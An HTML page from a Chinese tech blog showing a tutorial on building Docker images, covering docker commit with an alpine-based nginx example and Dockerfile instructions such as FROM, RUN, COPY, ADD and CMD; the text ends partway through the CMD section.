<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="//img.to2b.cn/blog/ljk/1607154764582.png">
  <link rel="icon" type="image/png" sizes="32x32" href="//img.to2b.cn/blog/ljk/1607154764582.png">
  <link rel="icon" type="image/png" sizes="16x16" href="//img.to2b.cn/blog/ljk/1607154764582.png">
  <link rel="mask-icon" href="//img.to2b.cn/blog/ljk/1607154764582.png" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//s1.to2b.cn/libs/fontawesome-free/5.15.4/css/all.min.css">

<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.lujinkai.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.16.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":10},"copycode":{"enable":true,"style":"flat"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"algolia":{"appID":"KN3H1V8A6V","apiKey":"c5d73d0dde2dd770ce49b505f938553d","indexName":"hexo","hits":{"per_page":20,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}}}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="LJKのBlog">
<meta property="og:url" content="http://blog.lujinkai.cn/page/9/index.html">
<meta property="og:site_name" content="LJKのBlog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="像方便面一样的男子">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://blog.lujinkai.cn/page/9/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/9/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>LJKのBlog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">LJKのBlog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">学无止境</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container">
  <div class="algolia-stats"><hr></div>
  <div class="algolia-hits"></div>
  <div class="algolia-pagination"></div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="像方便面一样的男子"
      src="//img.to2b.cn/blog/ljk/1607154764582.png">
  <p class="site-author-name" itemprop="name">像方便面一样的男子</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">340</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">73</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">99</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/ljkk" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ljkk" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/Docker/2.docker%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/Docker/2.docker%E9%95%9C%E5%83%8F%E5%88%B6%E4%BD%9C/" class="post-title-link" itemprop="url">docker镜像制作</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-08 11:27:49" itemprop="dateCreated datePublished" datetime="2021-01-08T11:27:49+08:00">2021-01-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>docker 镜像生命周期</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1605854412629.png"></p>
<p>制作镜像方法：</p>
<ul>
<li>手工制作（基于容器）</li>
<li>自动制作（基于 dockerfile），企业通常都是基于 dockerfile 制作镜像</li>
</ul>
<h2 id="手动构建镜像-commit"><a href="#手动构建镜像-commit" class="headerlink" title="手动构建镜像 commit"></a>手动构建镜像 <code>commit</code></h2><p>将现有容器通过 <code>docker commit</code> 或 <code>docker container commit</code> 手动构建镜像</p>
<p>根据容器的更改创建新镜像：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker container commit --help</span>
Usage:	<span class="token function">docker</span> container commit <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER <span class="token punctuation">[</span>REPOSITORY<span class="token punctuation">[</span>:TAG<span class="token punctuation">]</span><span class="token punctuation">]</span>

Options:
  -a, <span class="token parameter variable">--author</span> string    作者 <span class="token punctuation">(</span>e.g., <span class="token string">"John Hannibal Smith &lt;hannibal@a-team.com>"</span><span class="token punctuation">)</span>
  -c, <span class="token parameter variable">--change</span> list      使用Dockerfile指令来创建镜像
  -m, <span class="token parameter variable">--message</span> string   提交时的说明文字
  -p, <span class="token parameter variable">--pause</span>            在commit时，将容器暂停 <span class="token punctuation">(</span>default <span class="token boolean">true</span><span class="token punctuation">)</span></code></pre>

<p>说明：</p>
<ul>
<li>制作镜像和容器的状态无关，停止状态也可以制作</li>
<li>如果没有指定[REPOSITORY[:TAG]],REPOSITORY 和 TAG 都为&lt;none&gt;</li>
<li>提交的时候标记 TAG，后期可以根据 TAG 标记创建不同版本的镜像以及创建不同版本的容器</li>
</ul>
<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><ol>
<li>下载一个官方的基础镜像，例如：centos、ubuntu、alpine</li>
<li>基于基础镜像启动一个容器，并进入</li>
<li>在容器里面进行安装服务、修改配置等操作</li>
<li>提交一个新镜像 <code>docker container commit</code></li>
<li>基于自己的镜像创建容器并访问、</li>
</ol>
<h3 id="案例：基于-alpine-基础镜像制作-nginx-镜像"><a href="#案例：基于-alpine-基础镜像制作-nginx-镜像" class="headerlink" title="案例：基于 alpine 基础镜像制作 nginx 镜像"></a>案例：基于 alpine 基础镜像制作 nginx 镜像</h3><ol>
<li><p>下载最新版 alpine 基础镜像</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># docker pull alpine</span></code></pre>
</li>
<li><p>启动 alpine 并进入</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># docker container run -it alpine</span>
/ <span class="token comment">#</span></code></pre>
</li>
<li><p>另开一个终端，将 shell 脚本拷贝到 alpine 镜像</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lujinkai@Z510:~/www/script$ <span class="token function">sudo</span> <span class="token function">docker</span> container <span class="token function">ls</span>
CONTAINER ID  IMAGE   COMMAND    CREATED             STATUS    PORTS    NAMES
b8de1bdb6c88  alpine  <span class="token string">"/bin/sh"</span>  About a minute ago  Up About a minute  funny_chatelet

lujinkai@Z510:~/www/script$ <span class="token function">sudo</span> <span class="token function">docker</span> container <span class="token function">cp</span> <span class="token parameter variable">-a</span> ./alpine-docker/ b8de:/root</code></pre>
</li>
<li><p>回到容器，运行 shell 脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># docker container run -it alpine</span>
/ <span class="token comment"># cd</span>
~ <span class="token comment"># ls</span>
alpine-docker
~ <span class="token comment"># cd alpine-docker/</span>
~/alpine-docker <span class="token comment"># ./install.sh</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span>
make<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: Leaving directory <span class="token string">'/root/alpine-docker/src/nginx-1.18.0'</span>
Nginx installed successfully<span class="token operator">!</span>
~/alpine-docker <span class="token comment"># exit</span></code></pre>
</li>
<li><p>提交镜像</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lujinkai@Z510:~$ <span class="token function">sudo</span> <span class="token function">docker</span> container commit <span class="token punctuation">\</span>
    <span class="token parameter variable">-a</span> <span class="token string">'lujinkai&lt;root@lujinkai.com>'</span> <span class="token punctuation">\</span>
    <span class="token parameter variable">-c</span> <span class="token string">'EXPOSE 80'</span> <span class="token punctuation">\</span>
    <span class="token parameter variable">-c</span> <span class="token string">'CMD ["/usr/local/nginx/sbin/nginx"]'</span> <span class="token punctuation">\</span>
    b8de1bdb6c88 nginx-alpine:v1
lujinkai@Z510:~$ <span class="token function">sudo</span> <span class="token operator">!</span><span class="token operator">!</span>
<span class="token function">sudo</span> <span class="token function">docker</span> image <span class="token function">ls</span>
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx-alpine        v1                  de56d80c5c8c        <span class="token number">14</span> seconds ago      340MB
alpine              latest              d6e46aa2470d        <span class="token number">4</span> weeks ago         <span class="token number">5</span>.57MB</code></pre>
</li>
<li><p>启动基于新制作镜像的容器</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># docker container run -d -p 80:80 nginx-alpine:v1</span>
ebbe778a7fe303e6a5cb840203d95a7b5e2a07208365b71f784ddc8357a664d7
root@Z510:~<span class="token comment"># curl 127.0.0.1:81</span>
hello nginx</code></pre>

<p><img data-src="//img.to2b.cn/blog/ljk/1605926835392.png"></p>
</li>
<li><p>iptables</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># iptables -t nat -nL</span>
<span class="token punctuation">..</span>.
Chain DOCKER <span class="token punctuation">(</span><span class="token number">2</span> references<span class="token punctuation">)</span>
target     prot opt <span class="token builtin class-name">source</span>		destination
RETURN     all  --  anywhere	anywhere
DNAT       tcp  --  <span class="token number">0.0</span>.0.0/0	<span class="token number">0.0</span>.0.0/0		tcp dpt:81 to:172.17.0.2:80</code></pre>
</li>
<li><p>ss</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@Z510:~<span class="token comment"># ss -ntl</span>
State	Recv-Q	Send-Q	Local Address:Port	Peer Address:Port	Process
<span class="token punctuation">..</span>.
LISTEN	<span class="token number">0</span>		<span class="token number">4096</span>		*:81					*:*
<span class="token punctuation">..</span>.</code></pre>
</li>
<li><p>有需求的话，可以导出镜像：<code>docker image save [OPTIONS] IMAGE </code></p>
</li>
</ol>
<h2 id="自动构建镜像"><a href="#自动构建镜像" class="headerlink" title="自动构建镜像"></a>自动构建镜像</h2><p><code>docker builder build</code> 从 DockerFile 文件中构建镜像</p>
<h3 id="docker-builder-build"><a href="#docker-builder-build" class="headerlink" title="docker builder build"></a><code>docker builder build</code></h3><p><code>docker builder build</code> 或 <code>docker build</code> 命令用来基于 dockerfile 构建镜像</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> builder build <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> <span class="token environment constant">PATH</span> <span class="token operator">|</span> URL <span class="token operator">|</span> -

<span class="token environment constant">PATH</span> <span class="token operator">|</span> URL <span class="token operator">|</span> -
上下文目录，如果设置为 - ，则从标准输入获取 dockerfile 的内容，什么是上下文目录？举个例子：COPY 指令复制文件时，源文件只能在上下文目录

OPTIONS
  	-f, <span class="token parameter variable">--file</span> string				指定Dockerfile文件，默认为上下文目录下的 Dockerfile
  		--force-rm					总是删除中间层容器，创建镜像失败时，删除临时容器
  		--no-cache					不使用之前构建中创建的缓存
  		<span class="token parameter variable">--rm</span><span class="token operator">=</span>true					创建镜像成功时，删除临时容器
	-c, --cpu-shares int			设置 cpu 使用权重，按照比例分配cpu资源，当只有一个容器时，<span class="token variable"><span class="token variable">`</span>--cpu-shares<span class="token variable">`</span></span> 选项没有意义。
  	-m, <span class="token parameter variable">--memory</span> bytes				设置构建内存上限
  	-t, <span class="token parameter variable">--tag</span> list					为构建的镜像打上标签
  	-q, <span class="token parameter variable">--quiet</span>						不显示构建过程的信息</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token builtin class-name">.</span>
<span class="token function">docker</span> build /usr/local/src/nginx
<span class="token function">docker</span> build <span class="token parameter variable">-f</span> /path/to/a/Dockerfile <span class="token builtin class-name">.</span>
<span class="token function">docker</span> build <span class="token parameter variable">-t</span> shykes/myapp <span class="token builtin class-name">.</span>
<span class="token function">docker</span> build <span class="token parameter variable">-t</span> shykes/myapp:1.0.2 <span class="token parameter variable">-t</span> shykes/myapp:latest <span class="token builtin class-name">.</span>
<span class="token function">docker</span> build <span class="token parameter variable">-t</span> test/myapp <span class="token builtin class-name">.</span>
<span class="token function">docker</span> build <span class="token parameter variable">-t</span> nginx:v1 /usr/local/src/nginx

<span class="token function">docker</span> builder build <span class="token parameter variable">-t</span> nginx:v1 <span class="token builtin class-name">.</span>    <span class="token comment"># 构建一个镜像，指定上下文目录为当前目录</span></code></pre>

<h3 id="Dockerfile-介绍"><a href="#Dockerfile-介绍" class="headerlink" title="Dockerfile 介绍"></a>Dockerfile 介绍</h3><p>DockerFile 是一种被 Docker 程序解释执行的脚本，由一条条的命令组成的，每条命令对应 linux 下面的一条命令，Docker 程序将这些 DockerFile 指令翻译成真正的 linux 命令，其有自己的书写方式和支持的命令，Docker 程序读取 DockerFile 并根据指令生成 Docker 镜像，相比手动制作镜像的方式，DockerFile 更能直观的展示镜像是怎么产生的，有了 DockerFile，当后期有额外的需求时，只要在之前的 DockerFile 添加或者修改响应的命令即可重新生成新的 Docker 镜像，避免了重复手动制作镜像的麻烦，类似与 shell 脚本一样，可以方便高效的制作镜像。</p>
<p>Docker 守护程序 Dockerfile 逐一运行指令，如有必要，将每个指令的结果提交到新镜像，然后最终输出新镜像的 ID。Docker 守护程序将自动清理之前发送的上下文。</p>
<p>请注意，每条指令都是独立运行的，并会导致创建新镜像，比如 <code>RUN cd /tmp</code> 对下一条指令不会有任何影响。</p>
<p>Docker 将尽可能重用中间镜像层（缓存），以显著加速 <code>docker builder build</code> 命令的执行过程，这由 Using cache 控制台输出中的消息指示。</p>
<h3 id="Dockerfile-镜像制作和使用流程"><a href="#Dockerfile-镜像制作和使用流程" class="headerlink" title="Dockerfile 镜像制作和使用流程"></a>Dockerfile 镜像制作和使用流程</h3><p><img data-src="//img.to2b.cn/blog/lujinkai/1670391994648.png"></p>
<h3 id="Dockerfile-文件的制作镜像的分层结构"><a href="#Dockerfile-文件的制作镜像的分层结构" class="headerlink" title="Dockerfile 文件的制作镜像的分层结构"></a>Dockerfile 文件的制作镜像的分层结构</h3><p><img data-src="//img.to2b.cn/blog/lujinkai/1670392239691.png"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 按照业务类型或系统类型等方式划分创建目录环境，方便后期镜像比较多的时候进行分类</span>
<span class="token punctuation">[</span>root@ubuntu1804 ~<span class="token punctuation">]</span>$ <span class="token function">mkdir</span>
/data/dockerfile/<span class="token punctuation">&#123;</span>web/<span class="token punctuation">&#123;</span>nginx,apache,tomcat,jdk<span class="token punctuation">&#125;</span>,system/<span class="token punctuation">&#123;</span>centos,ubuntu,alpine,debian<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token parameter variable">-p</span>
<span class="token punctuation">[</span>root@ubuntu1804 ~<span class="token punctuation">]</span>$ tree /data/dockerfile/
/data/dockerfile/
├── system
│├── alpine
│├── centos
│├── debian
│└── ubuntu
└── web
├── apache
├── jdk
├── nginx
└── tomcat
<span class="token number">10</span> directories, <span class="token number">0</span> files</code></pre>

<h4 id="build-构建过程"><a href="#build-构建过程" class="headerlink" title="build 构建过程"></a>build 构建过程</h4><ol>
<li>从基础镜像运行一个容器</li>
<li>顺序执行一条指令对容器做出修改</li>
<li>执行类似 <code>docker commit</code> 的操作提交一个新的镜像层（可以利用中间层镜像创建容器进行调试和排错）</li>
<li>docker 基于刚才提交的镜像运行一个新的容器</li>
<li>执行 Dockerfile 中的下一条指令，直至所有指令执行完毕</li>
</ol>
<h3 id="Dockerfile-文件格式"><a href="#Dockerfile-文件格式" class="headerlink" title="Dockerfile 文件格式"></a>Dockerfile 文件格式</h3><p>Dockerfile 是一个有特定语法格式的文本文件</p>
<ul>
<li>每一行以 Dockerfile 的指令开头，指令不区分大小写，但是惯例使用大写</li>
<li>使用 # 开始作为注释</li>
<li>每一行只支持一条指令，每条指令可以携带多个参数</li>
<li>指令按文件的顺序从上至下进行执行</li>
<li>每个指令的执行会生成一个新的镜像层，为了减少分层和镜像大小，尽可能将多条指令合并成一条指令</li>
<li>制作镜像一般可能需要反复多次，每次执行 Dockerfile 都按顺序执行，从头开始，已经执行过的指令已经缓存，不需要再执行，如果后续有一行新的指令没执行过，其往后的指令将会重新执行，所以为加速镜像制作，将最常变化的内容放下 Dockerfile 的文件的后面</li>
</ul>
<h3 id="Dockerfile-相关指令"><a href="#Dockerfile-相关指令" class="headerlink" title="Dockerfile 相关指令"></a>Dockerfile 相关指令</h3><p><code>docker builder build</code> 命令基于 dockerfile 构建镜像，<code>docker container run</code> 命令基于镜像启动容器</p>
<p>所以 dockerfile 的指令也分为三类：</p>
<ul>
<li>在 <code>docker builder build</code> 阶段运行</li>
<li>在 <code>docker container run</code> 阶段运行</li>
<li>在以上两个阶段都运行，这种命令都是“设置”相关的，例如 <code>USER</code> 设置用户、<code>ENV</code> 设置环境变量、<code>WORKDIR</code> 设置工作目录，它们的设置在 build 和 run 两个阶段都生效</li>
</ul>
<p><img data-src="//img.to2b.cn/blog/ljk/1615612988998.png"></p>
<h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p><code>FORM</code> 指定基础镜像，此指令通常必需放在 Dockerfile 文件第一个非注释行。后续的指令都是运行于此基准镜像所提供的运行环境</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">FROM <span class="token punctuation">[</span>--platform<span class="token operator">=</span><span class="token operator">&lt;</span>platform<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span>image<span class="token operator">></span><span class="token punctuation">[</span>:<span class="token operator">&lt;</span>tag<span class="token operator">></span><span class="token punctuation">]</span></code></pre>

<p><strong>关于 scratch 镜像：</strong></p>
<p>该镜像是一个空的镜像，可以用于构建 busybox 等超小镜像，可以说是真正的从零开始构建属于自己的镜像该镜像在构建基础镜像（例如 debian 和 busybox）或超最小镜像（仅包含一个二进制文件及其所需内容，例如:hello-world）的上下文中最有用</p>
<h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p><code>LABEL</code> 指定镜像元数据，如 镜像作者等</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">LABEL <span class="token operator">&lt;</span>key<span class="token operator">>=</span><span class="token operator">&lt;</span>value<span class="token operator">></span> <span class="token operator">&lt;</span>key<span class="token operator">>=</span><span class="token operator">&lt;</span>value<span class="token operator">></span> <span class="token operator">&lt;</span>key<span class="token operator">>=</span><span class="token operator">&lt;</span>value<span class="token operator">></span> <span class="token punctuation">..</span>.</code></pre>

<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">LABEL <span class="token assign-left variable">maintainer</span><span class="token operator">=</span><span class="token string">"lujinkai &lt;root@lujinkai.com>"</span> <span class="token punctuation">\</span>
    <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token punctuation">\</span>
    <span class="token assign-left variable">other</span><span class="token operator">=</span><span class="token string">"value3"</span> <span class="token punctuation">\</span>
    <span class="token assign-left variable">description</span><span class="token operator">=</span><span class="token string">"some description"</span> <span class="token punctuation">\</span>
    <span class="token assign-left variable">other</span><span class="token operator">=</span><span class="token string">"value1"</span></code></pre>

<p>注意：MAINTAINER 指令已过时，使用 LABEL 代替</p>
<h4 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h4><p><code>RUN</code> 指令用来在 build 阶段需要执行 shell 命令，一定要是继承的镜像所支持的 shell 命令</p>
<p>注意: <code>RUN</code> 可以写多个，每一个 <code>RUN</code> 指令都会建立一个镜像层，所以尽可能使用 &amp;&amp; 将多条指令合并为一条</p>
<p>相邻的 <code>RUN</code> 命令相互独立，示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">RUN <span class="token builtin class-name">cd</span> /app
RUN <span class="token builtin class-name">echo</span> <span class="token string">"hello"</span> <span class="token operator">></span> world.txt		<span class="token comment"># world.txt并不存放在/app内</span></code></pre>

<h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p><code>ENV</code> 定义环境变量和值，会被后续指令通过$KEY或${KEY}进行引用，并在容器运行时保持</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ENV <span class="token operator">&lt;</span>key<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token operator">=</span><span class="token operator">&lt;</span>value<span class="token operator"><span class="token file-descriptor important">1</span>></span> <span class="token punctuation">\</span>
	<span class="token operator">&lt;</span>key<span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token operator">=</span><span class="token operator">&lt;</span>value<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token punctuation">\</span>
	<span class="token operator">&lt;</span>key<span class="token operator"><span class="token file-descriptor important">3</span>></span><span class="token operator">=</span><span class="token operator">&lt;</span>value<span class="token operator"><span class="token file-descriptor important">3</span>></span>

<span class="token comment"># 变量支持高级赋值格式</span>
<span class="token variable">$&#123;key<span class="token operator">:-</span>word&#125;</span>
<span class="token variable">$&#123;kye<span class="token operator">:+</span>word&#125;</span></code></pre>

<p><code>docker run</code> 运行容器，如果需要修改环境变量，使用 <code> -e</code> 重新定义即可覆盖</p>
<h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">COPY <span class="token punctuation">[</span>--chown<span class="token operator">=</span><span class="token operator">&lt;</span>user<span class="token operator">></span>:<span class="token operator">&lt;</span>group<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">"&lt;src>"</span>,<span class="token punctuation">..</span>. <span class="token string">"&lt;dest>"</span><span class="token punctuation">]</span>	<span class="token comment"># 如果路径中有空白字符，加双引号</span></code></pre>

<ul>
<li><p><code>--chown=&lt;user&gt;:&lt;group&gt;</code>：改变复制到容器内文件的属主和属组，默认保留所有元数据</p>
</li>
<li><p><code>&quot;&lt;src&gt;&quot;</code></p>
<ul>
<li>支持通配符，通配符规则满足 Go 的 filepath.Match 规则</li>
<li>如果是目录，则其内部文件或子目录会被递归复制，但目录自身不会被复制</li>
</ul>
</li>
<li><p><code>&quot;&lt;dest&gt;&quot;</code></p>
<ul>
<li>支持绝对路径 或 WORKDIR 指定的相对路径</li>
<li>如果不存在，会自动创建，递归创建目录</li>
<li>如果<code>&quot;&lt;src&gt;&quot;</code>是多个文件，则<code>&quot;&lt;dest&gt;&quot;</code>必须是目录，且以 <code>/</code> 结尾</li>
</ul>
</li>
</ul>
<p>范例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">COPY hom* /mydir/
COPY hom?.txt /mydir/</code></pre>

<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>增强版 <code>COPY</code>，支持自动解压缩，如果只是复制，尽量使用 <code>COPY</code></p>
<p>支持解压缩（identity、gzip、bzip2、xz），支持解包（tar），支持像解压缩+解包，例如 <code>.tar.gz</code></p>
<p>注意：ADD 识别压缩文件，取决于文件内容，不取决于文件后缀，如果一个文本文件直接修改后缀为 <code>.tar.gz</code>，该文件将被简单地复制到目标文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ADD <span class="token punctuation">[</span>--chown<span class="token operator">=</span><span class="token operator">&lt;</span>user<span class="token operator">></span>:<span class="token operator">&lt;</span>group<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token string">"&lt;src>"</span>,<span class="token punctuation">..</span>. <span class="token string">"&lt;dest>"</span><span class="token punctuation">]</span></code></pre>

<ul>
<li><code>&quot;&lt;src&gt;&quot;</code>：支持 URL，下载后的文件权限自动设置为 600，如果下载的是 tar 文件将不会自动展开</li>
</ul>
<p>示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ADD <span class="token builtin class-name">test</span> relativeDir/ 		<span class="token comment"># adds "test" to `WORKDIR`/relativeDir/</span>
ADD <span class="token builtin class-name">test</span> /absoluteDir/ 		<span class="token comment"># adds "test" to /absoluteDir/</span>
ADD <span class="token parameter variable">--chown</span><span class="token operator">=</span><span class="token number">55</span>:mygroup files* /somedir/
ADD <span class="token parameter variable">--chown</span><span class="token operator">=</span>bin files* /somedir/
ADD <span class="token parameter variable">--chown</span><span class="token operator">=</span><span class="token number">1</span> files* /somedir/
ADD <span class="token parameter variable">--chown</span><span class="token operator">=</span><span class="token number">10</span>:11 files* /somedir/
ADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz /</code></pre>

<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p><code>CMD</code> 指定启动容器时默认执行的一个命令</p>
<ul>
<li>命令运行结束后容器也会停止，所以一般指定持续运行且为前台的命令</li>
<li>每个 Dockerfile 只能有一条<code>CMD</code> 命令。如指定了多条，只有最后一条被执行</li>
<li>如果用户启动容器时用 docker run xxx 指定运行的命令，则会覆盖 <code>CMD</code> 指定的命令</li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 exec 执行，推荐方式，第一个参数必须是命令的全路径,此种形式不支持环境变量</span>
